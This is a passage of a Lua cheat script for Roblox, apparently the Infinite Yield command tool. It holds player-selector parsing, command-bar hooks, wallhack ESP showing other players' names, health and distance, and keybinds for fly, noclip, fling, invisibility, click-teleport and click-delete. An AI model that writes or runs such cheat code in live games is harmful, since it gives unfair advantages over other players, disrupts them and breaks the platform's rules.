		["alive"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and plr.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["dead"] = function(speaker,args)
			local returns = {}
			for _,plr in pairs(Players:GetPlayers()) do
				if (not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid")) or plr.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
					table.insert(returns,plr)
				end
			end
			return returns
		end,
		["rad(%d+)"] = function(speaker,args)
			local returns = {}
			local radius = tonumber(args[1])
			local speakerChar = speaker.Character
			if not speakerChar or not getRoot(speakerChar) then return end
			for _,plr in pairs(Players:GetPlayers()) do
				if plr.Character and getRoot(plr.Character) then
					local magnitude = (getRoot(plr.Character).Position-getRoot(speakerChar).Position).magnitude
					if magnitude <= radius then table.insert(returns,plr) end
				end
			end
			return returns
		end
	}

	function toTokens(str)
		local tokens = {}
		for op,name in string.gmatch(str,"([+-])([^+-]+)") do
			table.insert(tokens,{Operator = op,Name = name})
		end
		return tokens
	end

	function onlyIncludeInTable(tab,matches)
		local matchTable = {}
		local resultTable = {}
		for i,v in pairs(matches) do matchTable[v.Name] = true end
		for i,v in pairs(tab) do if matchTable[v.Name] then table.insert(resultTable,v) end end
		return resultTable
	end

	function removeTableMatches(tab,matches)
		local matchTable = {}
		local resultTable = {}
		for i,v in pairs(matches) do matchTable[v.Name] = true end
		for i,v in pairs(tab) do if not matchTable[v.Name] then table.insert(resultTable,v) end end
		return resultTable
	end

	function getPlayersByName(name)
		local found = {}
		for i,v in pairs(Players:GetChildren()) do
			if string.sub(string.lower(v.Name),1,#name) == string.lower(name) then
				table.insert(found,v)
			end
		end
		return found
	end

	function getPlayer(list,speaker)
		if list == nil then return {speaker.Name} end
		local nameList = splitString(list,",")

		local foundList = {}

		for _,name in pairs(nameList) do
			if string.sub(name,1,1) ~= "+" and string.sub(name,1,1) ~= "-" then name = "+"..name end
			local tokens = toTokens(name)
			local initialPlayers = Players:GetPlayers()

			for i,v in pairs(tokens) do
				if v.Operator == "+" then
					local tokenContent = v.Name
					local foundCase = false
					for regex,case in pairs(SpecialPlayerCases) do
						local matches = {string.match(tokenContent,"^"..regex.."$")}
						if #matches > 0 then
							foundCase = true
							initialPlayers = onlyIncludeInTable(initialPlayers,case(speaker,matches,initialPlayers))
						end
					end
					if not foundCase then
						initialPlayers = onlyIncludeInTable(initialPlayers,getPlayersByName(tokenContent))
					end
				else
					local tokenContent = v.Name
					local foundCase = false
					for regex,case in pairs(SpecialPlayerCases) do
						local matches = {string.match(tokenContent,"^"..regex.."$")}
						if #matches > 0 then
							foundCase = true
							initialPlayers = removeTableMatches(initialPlayers,case(speaker,matches,initialPlayers))
						end
					end
					if not foundCase then
						initialPlayers = removeTableMatches(initialPlayers,getPlayersByName(tokenContent))
					end
				end
			end

			for i,v in pairs(initialPlayers) do table.insert(foundList,v) end
		end

		local foundNames = {}
		for i,v in pairs(foundList) do table.insert(foundNames,v.Name) end

		return foundNames
	end

	getprfx=function(strn)
		if strn:sub(1,string.len(prefix))==prefix then return{'cmd',string.len(prefix)+1}
		end return
	end

	function do_exec(str, plr)
		str = str:gsub('/e ', '')
		local t = getprfx(str)
		if not t then return end
		str = str:sub(t[2])
		if t[1]=='cmd' then
			execCmd(str, plr, true)
			IndexContents('',true,false,true)
			CMDsF.CanvasPosition = canvasPos
		end
	end

	lastTextBoxString,lastTextBoxCon,lastEnteredString = nil,nil,nil

	UserInputService.TextBoxFocused:Connect(function(obj)
		if lastTextBoxCon then lastTextBoxCon:Disconnect() end
		if obj == Cmdbar then lastTextBoxString = nil return end
		lastTextBoxString = obj.Text
		lastTextBoxCon = obj:GetPropertyChangedSignal("Text"):Connect(function()
			if not (UserInputService:IsKeyDown(Enum.KeyCode.Return) or UserInputService:IsKeyDown(Enum.KeyCode.KeypadEnter)) then
				lastTextBoxString = obj.Text
			end
		end)
	end)

	UserInputService.InputBegan:Connect(function(input,gameProcessed)
		if gameProcessed then
			if Cmdbar and Cmdbar:IsFocused() then
				if input.KeyCode == Enum.KeyCode.Up then
					historyCount = historyCount + 1
					if historyCount > #cmdHistory then historyCount = #cmdHistory end
					Cmdbar.Text = cmdHistory[historyCount] or ""
					Cmdbar.CursorPosition = 1020
				elseif input.KeyCode == Enum.KeyCode.Down then
					historyCount = historyCount - 1
					if historyCount < 0 then historyCount = 0 end
					Cmdbar.Text = cmdHistory[historyCount] or ""
					Cmdbar.CursorPosition = 1020
				end
			elseif input.KeyCode == Enum.KeyCode.Return or input.KeyCode == Enum.KeyCode.KeypadEnter then
				lastEnteredString = lastTextBoxString
			end
		end
	end)

	Players.LocalPlayer.Chatted:Connect(function()
		wait()
		if lastEnteredString then
			local message = lastEnteredString
			lastEnteredString = nil
			do_exec(message, Players.LocalPlayer)
		end
	end)

	Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
	Cmdbar:GetPropertyChangedSignal("Text"):Connect(function()
		if Cmdbar:IsFocused() then
			IndexContents(Cmdbar.Text,true,true)
		end
	end)

	local tabComplete = nil
	Cmdbar.FocusLost:Connect(function(enterpressed)
		if enterpressed then
			local cmdbarText = Cmdbar.Text:gsub("^"..'%'..prefix,"")
			execCmd(cmdbarText,Players.LocalPlayer,true)
		end
		if tabComplete then tabComplete:Disconnect() end
		wait()
		if not Cmdbar:IsFocused() then
			Cmdbar.Text = ""
			IndexContents('',true,false,true)
			if SettingsOpen == true then
				wait(0.2)
				Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.2, true, nil)
				CMDsF.Visible = false
			end
		end
		CMDsF.CanvasPosition = canvasPos
	end)

	Cmdbar.Focused:Connect(function()
		historyCount = 0
		canvasPos = CMDsF.CanvasPosition
		if SettingsOpen == true then
			wait(0.2)
			CMDsF.Visible = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.2, true, nil)
		end
		tabComplete = UserInputService.InputBegan:Connect(function(input,gameProcessed)
			if Cmdbar:IsFocused() then
				if input.KeyCode == Enum.KeyCode.Tab and topCommand ~= nil then
					autoComplete(topCommand)
				end
			else
				tabComplete:Disconnect()
			end
		end)
	end)

	ESPenabled = false
	CHMSenabled = false

	function round(num, numDecimalPlaces)
		local mult = 10^(numDecimalPlaces or 0)
		return math.floor(num * mult + 0.5) / mult
	end

	function ESP(plr)
		spawn(function()
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == plr.Name..'_ESP' then
					v:Destroy()
				end
			end
			wait()
			if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_ESP') then
				local ESPholder = Instance.new("Folder")
				ESPholder.Name = plr.Name..'_ESP'
				ESPholder.Parent = COREGUI
				repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
				for b,n in pairs (plr.Character:GetChildren()) do
					if (n:IsA("BasePart")) then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = plr.Name
						a.Parent = ESPholder
						a.Adornee = n
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = n.Size
						a.Transparency = 0.3
						a.Color = plr.TeamColor
					end
				end
				if plr.Character and plr.Character:FindFirstChild('Head') then
					local BillboardGui = Instance.new("BillboardGui")
					local TextLabel = Instance.new("TextLabel")
					BillboardGui.Adornee = plr.Character.Head
					BillboardGui.Name = plr.Name
					BillboardGui.Parent = ESPholder
					BillboardGui.Size = UDim2.new(0, 100, 0, 150)
					BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
					BillboardGui.AlwaysOnTop = true
					TextLabel.Parent = BillboardGui
					TextLabel.BackgroundTransparency = 1
					TextLabel.Position = UDim2.new(0, 0, 0, -50)
					TextLabel.Size = UDim2.new(0, 100, 0, 100)
					TextLabel.Font = Enum.Font.SourceSansSemibold
					TextLabel.TextSize = 20
					TextLabel.TextColor3 = Color3.new(1, 1, 1)
					TextLabel.TextStrokeTransparency = 0
					TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
					TextLabel.Text = 'Name: '..plr.Name
					TextLabel.ZIndex = 10
					local espLoopFunc
					local teamChange
					local addedFunc
					addedFunc = plr.CharacterAdded:Connect(function()
						if ESPenabled then
							espLoopFunc:Disconnect()
							teamChange:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
							ESP(plr)
							addedFunc:Disconnect()
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
						end
					end)
					teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
						if ESPenabled then
							espLoopFunc:Disconnect()
							addedFunc:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
							ESP(plr)
							teamChange:Disconnect()
						else
							teamChange:Disconnect()
						end
					end)
					local function espLoop()
						if COREGUI:FindFirstChild(plr.Name..'_ESP') then
							if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid') and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid') then
								local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
								TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
							end
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
							espLoopFunc:Disconnect()
						end
					end
					espLoopFunc = game:GetService("RunService").RenderStepped:Connect(espLoop)
				end
			end
		end)
	end

	function CHMS(plr)
		spawn(function()
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == plr.Name..'_CHMS' then
					v:Destroy()
				end
			end
			wait()
			if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_CHMS') then
				local ESPholder = Instance.new("Folder")
				ESPholder.Name = plr.Name..'_CHMS'
				ESPholder.Parent = COREGUI
				repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
				for b,n in pairs (plr.Character:GetChildren()) do
					if (n:IsA("BasePart")) then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = plr.Name
						a.Parent = ESPholder
						a.Adornee = n
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = n.Size
						a.Transparency = 0.3
						a.Color = plr.TeamColor
					end
				end
				local addedFunc
				local teamChange
				local CHMSremoved
				addedFunc = plr.CharacterAdded:Connect(function()
					if CHMSenabled then
						ESPholder:Destroy()
						teamChange:Disconnect()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
						CHMS(plr)
						addedFunc:Disconnect()
					else
						teamChange:Disconnect()
						addedFunc:Disconnect()
					end
				end)
				teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
					if CHMSenabled then
						ESPholder:Destroy()
						addedFunc:Disconnect()
						repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
						CHMS(plr)
						teamChange:Disconnect()
					else
						teamChange:Disconnect()
					end
				end)
				CHMSremoved = ESPholder.AncestryChanged:Connect(function()
					teamChange:Disconnect()
					addedFunc:Disconnect()
					CHMSremoved:Disconnect()
				end)
			end
		end)
	end

	function Locate(plr)
		spawn(function()
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == plr.Name..'_LC' then
					v:Destroy()
				end
			end
			wait()
			if plr.Character and plr.Name ~= Players.LocalPlayer.Name and not COREGUI:FindFirstChild(plr.Name..'_LC') then
				local ESPholder = Instance.new("Folder")
				ESPholder.Name = plr.Name..'_LC'
				ESPholder.Parent = COREGUI
				repeat wait(1) until plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
				for b,n in pairs (plr.Character:GetChildren()) do
					if (n:IsA("BasePart")) then
						local a = Instance.new("BoxHandleAdornment")
						a.Name = plr.Name
						a.Parent = ESPholder
						a.Adornee = n
						a.AlwaysOnTop = true
						a.ZIndex = 10
						a.Size = n.Size
						a.Transparency = 0.3
						a.Color = plr.TeamColor
					end
				end
				if plr.Character and plr.Character:FindFirstChild('Head') then
					local BillboardGui = Instance.new("BillboardGui")
					local TextLabel = Instance.new("TextLabel")
					BillboardGui.Adornee = plr.Character.Head
					BillboardGui.Name = plr.Name
					BillboardGui.Parent = ESPholder
					BillboardGui.Size = UDim2.new(0, 100, 0, 150)
					BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
					BillboardGui.AlwaysOnTop = true
					TextLabel.Parent = BillboardGui
					TextLabel.BackgroundTransparency = 1
					TextLabel.Position = UDim2.new(0, 0, 0, -50)
					TextLabel.Size = UDim2.new(0, 100, 0, 100)
					TextLabel.Font = Enum.Font.SourceSansSemibold
					TextLabel.TextSize = 20
					TextLabel.TextColor3 = Color3.new(1, 1, 1)
					TextLabel.TextStrokeTransparency = 0
					TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
					TextLabel.Text = 'Name: '..plr.Name
					TextLabel.ZIndex = 10
					local lcLoopFunc
					local addedFunc
					local teamChange
					addedFunc = plr.CharacterAdded:Connect(function()
						if ESPholder ~= nil and ESPholder.Parent ~= nil then
							lcLoopFunc:Disconnect()
							teamChange:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
							Locate(plr)
							addedFunc:Disconnect()
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
						end
					end)
					teamChange = plr:GetPropertyChangedSignal("TeamColor"):Connect(function()
						if ESPholder ~= nil and ESPholder.Parent ~= nil then
							lcLoopFunc:Disconnect()
							addedFunc:Disconnect()
							ESPholder:Destroy()
							repeat wait(1) until getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid')
							Locate(plr)
							teamChange:Disconnect()
						else
							teamChange:Disconnect()
						end
					end)
					local function lcLoop()
						if COREGUI:FindFirstChild(plr.Name..'_LC') then
							if plr.Character and getRoot(plr.Character) and plr.Character:FindFirstChild('Humanoid') and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid') then
								local pos = math.floor((getRoot(Players.LocalPlayer.Character).Position - getRoot(plr.Character).Position).magnitude)
								TextLabel.Text = 'Name: '..plr.Name..' | Health: '..round(plr.Character:FindFirstChildOfClass('Humanoid').Health, 1)..' | Studs: '..pos
							end
						else
							teamChange:Disconnect()
							addedFunc:Disconnect()
							lcLoopFunc:Disconnect()
						end
					end
					lcLoopFunc = game:GetService("RunService").RenderStepped:Connect(lcLoop)
				end
			end
		end)
	end

	local bindsGUI = KeybindEditor
	local awaitingInput = false
	local keySelected = false

	function unkeybind(cmd,key)
		for i = #binds,1,-1 do
			if binds[i].COMMAND == cmd and binds[i].KEY == key then
				table.remove(binds, i)
			end
		end
		refreshbinds()
		updatesaves()
		if key == 'RightClick' or key == 'LeftClick' then
			notify('Keybinds Updated','Unbinded '..key..' from '..cmd)
		else
			notify('Keybinds Updated','Unbinded '..key:sub(14)..' from '..cmd)
		end
	end

	function refreshbinds()
		if Holder_2 then
			Holder_2:ClearAllChildren()
			Holder_2.CanvasSize = UDim2.new(0, 0, 0, 10)
			for i = 1, #binds do
				local YSize = 25
				local Position = ((i * YSize) - YSize)
				local newbind = Example_2:Clone()
				newbind.Parent = Holder_2
				newbind.Visible = true
				newbind.Position = UDim2.new(0,0,0, Position + 5)
				table.insert(shade2,newbind)
				table.insert(shade2,newbind.Text)
				table.insert(text1,newbind.Text)
				table.insert(shade3,newbind.Text.Delete)
				table.insert(text2,newbind.Text.Delete)
				local input = tostring(binds[i].KEY)
				local key
				if input == 'RightClick' or input == 'LeftClick' then
					key = input
				else
					key = input:sub(14)
				end
				newbind.Text.Text = key.." > "..binds[i].COMMAND.."  "..(binds[i].ISKEYUP and "(keyup)" or "(keydown)")
				Holder_2.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newbind.Text.Delete.MouseButton1Click:Connect(function()
					unkeybind(binds[i].COMMAND,binds[i].KEY)
				end)
			end
		end
	end

	refreshbinds()

	PositionsFrame.Delete.MouseButton1Click:Connect(function()
		execCmd('cpos')
	end)

	function refreshwaypoints()
		if #WayPoints > 0 or #pWayPoints > 0 then
			PositionsHint:Destroy()
		end
		if Holder_4 then
			Holder_4:ClearAllChildren()
			Holder_4.CanvasSize = UDim2.new(0, 0, 0, 10)
			local YSize = 25
			local num = 1
			for i = 1, #WayPoints do
				local Position = ((num * YSize) - YSize)
				local newpoint = Example_4:Clone()
				newpoint.Parent = Holder_4
				newpoint.Visible = true
				newpoint.Position = UDim2.new(0,0,0, Position + 5)
				newpoint.Text.Text = WayPoints[i].NAME
				table.insert(shade2,newpoint)
				table.insert(shade2,newpoint.Text)
				table.insert(text1,newpoint.Text)
				table.insert(shade3,newpoint.Text.Delete)
				table.insert(text2,newpoint.Text.Delete)
				table.insert(shade3,newpoint.Text.TP)
				table.insert(text2,newpoint.Text.TP)
				Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newpoint.Text.Delete.MouseButton1Click:Connect(function()
					execCmd('dpos '..WayPoints[i].NAME)
				end)
				newpoint.Text.TP.MouseButton1Click:Connect(function()
					execCmd("loadpos "..WayPoints[i].NAME)
				end)
				num = num+1
			end
			for i = 1, #pWayPoints do
				local Position = ((num * YSize) - YSize)
				local newpoint = Example_4:Clone()
				newpoint.Parent = Holder_4
				newpoint.Visible = true
				newpoint.Position = UDim2.new(0,0,0, Position + 5)
				newpoint.Text.Text = pWayPoints[i].NAME
				table.insert(shade2,newpoint)
				table.insert(shade2,newpoint.Text)
				table.insert(text1,newpoint.Text)
				table.insert(shade3,newpoint.Text.Delete)
				table.insert(text2,newpoint.Text.Delete)
				table.insert(shade3,newpoint.Text.TP)
				table.insert(text2,newpoint.Text.TP)
				Holder_4.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newpoint.Text.Delete.MouseButton1Click:Connect(function()
					execCmd('dpos '..pWayPoints[i].NAME)
				end)
				newpoint.Text.TP.MouseButton1Click:Connect(function()
					execCmd("loadpos "..pWayPoints[i].NAME)
				end)
				num = num+1
			end
		end
	end

	refreshwaypoints()

	function refreshaliases()
		if #aliases > 0 then
			AliasHint:Destroy()
		end
		if Holder_3 then
			Holder_3:ClearAllChildren()
			Holder_3.CanvasSize = UDim2.new(0, 0, 0, 10)
			for i = 1, #aliases do
				local YSize = 25
				local Position = ((i * YSize) - YSize)
				local newalias = Example_3:Clone()
				newalias.Parent = Holder_3
				newalias.Visible = true
				newalias.Position = UDim2.new(0,0,0, Position + 5)
				newalias.Text.Text = aliases[i].CMD.." > "..aliases[i].ALIAS
				table.insert(shade2,newalias)
				table.insert(shade2,newalias.Text)
				table.insert(text1,newalias.Text)
				table.insert(shade3,newalias.Text.Delete)
				table.insert(text2,newalias.Text.Delete)
				Holder_3.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newalias.Text.Delete.MouseButton1Click:Connect(function()
					execCmd('removealias '..aliases[i].ALIAS)
				end)
			end
		end
	end

	local bindChosenKeyUp = false

	BindTo.MouseButton1Click:Connect(function()
		awaitingInput = true
		BindTo.Text = 'Press something'
	end)

	BindTriggerSelect.MouseButton1Click:Connect(function()
		bindChosenKeyUp = not bindChosenKeyUp
		BindTriggerSelect.Text = bindChosenKeyUp and "KeyUp" or "KeyDown"
	end)

	Add_2.MouseButton1Click:Connect(function()
		if keySelected then
			if string.find(Cmdbar_2.Text, "\\\\") then
				notify('Keybind Error','Only use one backslash to keybind multiple commands into one keybind or command')
			else
				addbind(Cmdbar_2.Text,keyPressed,bindChosenKeyUp)
				refreshbinds()
				updatesaves()
				if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
					notify('Keybinds Updated','Binded '..keyPressed..' to '..Cmdbar_2.Text)
				else
					notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to '..Cmdbar_2.Text)
				end
			end
		end
	end)

	Exit_2.MouseButton1Click:Connect(function()
		Cmdbar_2.Text = 'Command'
		BindTo.Text = 'Click to bind'
		bindChosenKeyUp = false
		BindTriggerSelect.Text = "KeyDown"
		keySelected = false
		KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
	end)

	function onInputBegan(input,gameProcessed)
		if awaitingInput then
			if input.UserInputType == Enum.UserInputType.Keyboard then
				keyPressed = tostring(input.KeyCode)
				BindTo.Text = keyPressed:sub(14)
			elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
				keyPressed = 'LeftClick'
				BindTo.Text = 'LeftClick'
			elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
				keyPressed = 'RightClick'
				BindTo.Text = 'RightClick'
			end
			awaitingInput = false
			keySelected = true
		end
		if not gameProcessed and #binds > 0 then
			for i,v in pairs(binds) do
				if not v.ISKEYUP then
					if input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower() then
						execCmd(v.COMMAND,Players.LocalPlayer)
					elseif input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick' then
						execCmd(v.COMMAND,Players.LocalPlayer)
					elseif input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick' then
						execCmd(v.COMMAND,Players.LocalPlayer)
					end
				end
			end
		end
	end

	function onInputEnded(input,gameProcessed)
		if not gameProcessed and #binds > 0 then
			for i,v in pairs(binds) do
				if v.ISKEYUP then
					if input.UserInputType == Enum.UserInputType.Keyboard and v.KEY:lower()==tostring(input.KeyCode):lower() then
						execCmd(v.COMMAND,Players.LocalPlayer)
					elseif input.UserInputType == Enum.UserInputType.MouseButton1 and v.KEY:lower()=='leftclick' then
						execCmd(v.COMMAND,Players.LocalPlayer)
					elseif input.UserInputType == Enum.UserInputType.MouseButton2 and v.KEY:lower()=='rightclick' then
						execCmd(v.COMMAND,Players.LocalPlayer)
					end
				end
			end
		end
	end

	UserInputService.InputBegan:Connect(onInputBegan)
	UserInputService.InputEnded:Connect(onInputEnded)

	Fly.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglefly',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle fly')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle fly')
			end
		end
	end)

	Noclip.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglenoclip',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle noclip')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle noclip')
			end
		end
	end)

	Float.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglefloat',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle float')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle float')
			end
		end
	end)

	ClickTP.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('clicktp',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to click tp')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click tp')
			end
		end
	end)

	ClickDelete.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('clickdel',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to click delete')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click delete')
			end
		end
	end)

	Xray.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglexray',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle xray')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle xray')
			end
		end
	end)

	Swim.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('toggleswim',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle swim')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle swim')
			end
		end
	end)

	Fling.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglefling',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle fling')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle fling')
			end
		end
	end)

	Invisible.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('toggleinvis',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle invisible')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle invisible')
			end
		end
	end)

	Vehiclefly.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglevfly',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle vehiclefly')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle vehiclefly')
			end
		end
	end)

	VehicleNoclip.Select.MouseButton1Click:Connect(function()
		if keySelected then
			addbind('togglevnoclip',keyPressed,bindChosenKeyUp)
			refreshbinds()
			updatesaves()
			if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
				notify('Keybinds Updated','Binded '..keyPressed..' to toggle vehiclenoclip')
			else
				notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to toggle vehiclenoclip')
			end
		end
	end)

	local function clicktpFunc()
		pcall(function()
			if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			getRoot(Players.LocalPlayer.Character).CFrame = IYMouse.Hit + Vector3.new(0,7,0)
		end)
	end

	IYMouse.Button1Down:Connect(function()
		for i,v in pairs(binds) do
			if v.COMMAND == 'clicktp' then
				local input = v.KEY
				if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) and Players.LocalPlayer.Character then
					clicktpFunc()
				elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Players.LocalPlayer.Character then
					clicktpFunc()
				elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) and Players.LocalPlayer.Character then
					clicktpFunc()
				end
			elseif v.COMMAND == 'clickdel' then
				local input = v.KEY
				if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
					pcall(function() IYMouse.Target:Destroy() end)
				elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
					pcall(function() IYMouse.Target:Destroy() end)
				elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) then
					pcall(function() IYMouse.Target:Destroy() end)
				end
			end
		end
	end)

	PluginsGUI = PluginEditor.background

	function addPlugin(name)
		if name:lower() == 'plugin file name' or name:lower() == 'iy_fe.iy' or name == 'iy_fe' then
			notify('Plugin Error','Please enter a valid plugin')
		else
			local file
			local fileName
			if name:sub(-3) == '.iy' then
				pcall(function() file = readfile(name) end)
				fileName = name
			else
				pcall(function() file = readfile(name..'.iy') end)
				fileName = name..'.iy'
			end
			if file then
				if not FindInTable(PluginsTable, fileName) then
					table.insert(PluginsTable, fileName)
					LoadPlugin(fileName)
					refreshplugins()
					pcall(eventEditor.Refresh)
				else
					notify('Plugin Error','This plugin is already added')
				end
			else
				notify('Plugin Error','Cannot locate file "'..fileName..'". Is the file in the correct folder?')
			end
		end
	end

	function deletePlugin(name)
		local pName = name..'.iy'
		if name:sub(-3) == '.iy' then
			pName = name
		end
		for i = #cmds,1,-1 do
			if cmds[i].PLUGIN == pName then
				table.remove(cmds, i)
			end
		end
		for i,v in pairs(CMDsF:GetChildren()) do
			if v.Name == 'PLUGIN_'..pName then
				v:Destroy()
			end
		end
		for i,v in pairs(PluginsTable) do
			if v == pName then
				table.remove(PluginsTable, i)
				notify('Removed Plugin',pName..' was removed')
			end
		end
		IndexContents('',true)
		refreshplugins()
	end

	function refreshplugins(dontSave)
		if #PluginsTable > 0 then
			PluginsHint:Destroy()
		end
		if Holder_5 then
			Holder_5:ClearAllChildren()
			Holder_5.CanvasSize = UDim2.new(0, 0, 0, 10)
			for i,v in pairs(PluginsTable) do
				local pName = v
				local YSize = 25
				local Position = ((i * YSize) - YSize)
				local newplugin = Example_5:Clone()
				newplugin.Parent = Holder_5
				newplugin.Visible = true
				newplugin.Position = UDim2.new(0,0,0, Position + 5)
				newplugin.Text.Text = pName
